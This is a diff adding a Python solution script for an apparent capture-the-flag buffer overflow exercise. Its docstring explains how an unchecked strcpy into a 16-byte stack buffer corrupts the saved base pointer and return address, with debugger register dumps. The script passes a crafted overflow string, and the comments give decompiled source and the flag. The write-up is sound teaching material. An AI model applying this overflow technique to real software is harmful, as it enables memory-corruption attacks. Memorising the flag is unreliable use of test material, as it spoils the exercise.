@@ -1,0 +1,127 @@
+#! /usr/bin/env python3
+
+# Ver 1.0 ~ Jakob, Spartak, Sean
+"""
+    First what is the Programm doing in the first place?
+    1. It registers a signal Method which prints the Buffer on the SEGFAULT Signal (Nr. 11)
+    2. It Checks its input:
+        2.1 Input should be at least one Argument (2, but the name of the programm is always the first one)
+        2.2 The argument at the position [9] should have an 'x' (Char), so our Input needs an 'x' at position 10 (we start from 0 in the programm)
+        2.3 The Size of the argument AND 3 should be zero (Bitwise AND)
+        ===> so the first two bits of our size should be 0 (size can be: 12, 16, 20, 24, 28, 32...)
+    3. If the argument is valid, the programm then calls a Method which simply copies the argument with strcpy (without n) to a local Buffer on the Stack which has a size of 16
+    4. The main method just prints out the argument and returns
+    (5. The Signal Method just prints the Flag via Puts to stdout if the program receives a SEGFAULT)
+    ==> Code of the Programm is below our solution (formated with Ghidra; in german, because lazyness)
+
+    Where is the problem? 
+    - if our input has a size of 12 nothing will happen (the programm does it job correctly)
+    - if our input has a size of 16 (or more), strcpy will cause a stackbufferoverflow 
+    ==> because our string has 16 Chars + 1 Nullbyte, in total 17 Bytes ==> strcpy will override one Byte on the Stack above our variable
+
+    What lives above our Variables? 
+    - because we are in the function f1 (own name for the function with the strcpy), above our local variable is nothing from us, but the saved RBP (old Basepointer from callee; Stackframe) and the return address to the callee (both are 8 Bytes long)
+    ==> with our Input of 16 Bytes strcpy will override 1 Byte of the old Basepointer
+    ==> if we leave f1, rbp will have a corrupted address (pop rbp will be called; dismantle stackframe of f1)
+    ==> if some other operation uses the address in rbp, we will most likely will have a SEGFAULT 
+
+    What happens next?
+    - because we registered a method on the Signal "SEGFAULT", this method will be called 
+    ==> this message prints the Overflow FLAG via. puts 
+
+    What will happen with more than 16 Bytes of input? 
+    - if we write 20 Bytes we will override even more of the old Basepointer ==> same result as with 16
+    - if we write 24, 28, 32 ... Bytes we will also override the return address
+    ==> so if the programm would try to return from f1, it will cause a SEGFAULT because the return address is our input
+    ==> also the bufferflag would be printed (SEGFAULT Signal)
+
+
+
+    *Just as a example, if we put in "aaaaaaaaaxcccvse" (16 Byte) as an argument the Registers would look like this before the SEGFAULT:
+
+    RAX  0x8
+    RBX  0x555555555270 ◂— push   r15
+    RCX  0x16
+    RDX  0x10
+    RDI  0x7fffffffdd00 ◂— 'aaaaaaaaaxcccvse'
+    RSI  0x7fffffffe1f6 ◂— 'aaaaaaaaaxcccvse'
+    R8   0x7fffffffdc70 ◂— 0x0
+    R9   0x0
+    R10  0x7ffff7dd5088 ◂— 0x10001a000018ec
+    R11  0x7ffff7f2ea40 (__strcpy_avx2) ◂— endbr64 
+    R12  0x5555555550a0 ◂— xor    ebp, ebp
+    R13  0x0
+    R14  0x0
+    R15  0x0
+    RBP  0x7fffffffdd00 ◂— 'aaaaaaaaaxcccvse' <== RBP does not look good
+    RSP  0x7fffffffdd20 —▸ 0x7fffffffde28 —▸ 0x7fffffffe1c7 ◂— '/home/neoquix/Git-Repos/Pabe/task_13/simple_bo'
+    RIP  0x55555555524b ◂— mov    rax, qword ptr [rax]
+
+     ► 0x55555555524b    mov    rax, qword ptr [rax] <== Segfault here (RAX is just 0x8, so somehow a address got corrupted)
+
+    Just as a example, if we put in "aaaaaaaaaxbbbbbbcccccccttttttttt" (32 Byte) as an argument the Registers would look like this before the SEGFAULT:
+
+    RAX  0x7fffffffdcf0 ◂— 'aaaaaaaaaxbbbbbbcccccccttttttttt'
+    RBX  0x555555555270 ◂— push   r15
+    RCX  0x6
+    RDX  0x20
+    RDI  0x7fffffffdcf0 ◂— 'aaaaaaaaaxbbbbbbcccccccttttttttt'
+    RSI  0x7fffffffe1e6 ◂— 'aaaaaaaaaxbbbbbbcccccccttttttttt'
+    R8   0x7fffffffdc60 ◂— 0x0
+    R9   0x0
+    R10  0x7ffff7dd5088 ◂— 0x10001a000018ec
+    R11  0x7ffff7f2ea40 (__strcpy_avx2) ◂— endbr64 
+    R12  0x5555555550a0 ◂— xor    ebp, ebp
+    R13  0x0
+    R14  0x0
+    R15  0x0
+    RBP  0x7463636363636363 ('ccccccct')
+    RSP  0x7fffffffdd08 ◂— 'tttttttt'
+    RIP  0x5555555551ca ◂— ret
+
+     ► 0x5555555551ca    ret    <0x7474747474747474> <== Return Address is the part "...7777" of our String
+
+    PS: you disabled stack Canaries with the "-fno-stack-protector" Flag for gcc?
+
+    PPS: Funny Thing: If you make the Overflow with a String which has 16 Charakters (and the x), sometimes the programm prints only the Solution Flag, 
+    and sometimes it prints the "Thanks! Your string is: Flag{...}" 
+    ==> I think it has something to do with bufferd IO and how far the programm goes :D
+"""
+
+import subprocess
+
+def main():
+    proc = subprocess.run(["./simple_bo", "aaaaaaaaaxbbbbbbcccccccttttttttt"])
+
+if __name__ == '__main__':
+    main()
+
+
+#Main Methode (vorraussichtlich): 
+#undefined8 main(int argc,char **argv){ // warum 8? sollte das nicht 4 sein? Int? oder evt. void?
+#    size_t sVar1;
+#  
+#    signal(11, signalPuts); //registriere SEGFAULT auf signalPuts
+#
+#    if (((1 < argc) && (argv[1][9] == 'x')) && (sVar1 = strlen(argv[1]), (sVar1 & 3) == 0)) {
+#        f1(argv[1]);
+#        printf("Thanks! Your string is: %s",argv[1]);
+#    }
+#
+#    return 0;
+#}
+
+#f1 Methode: 
+#void f1(char *str){
+#  char strcpyVAR [16];
+#  
+#  strcpy(strcpyVAR, str); // Possible Bufferoverflow ==> keine Längenüberprüfung
+#  return;
+#}
+
+#Singal Methode:
+#void signalPuts(void){
+#  puts(PTR_s_FLAG{OverflowsAreEasyRight?}_00104058); // ? das in Puts ist ne Variable, aber ka wieso so doof
+#
+#  exit(1);
+#}
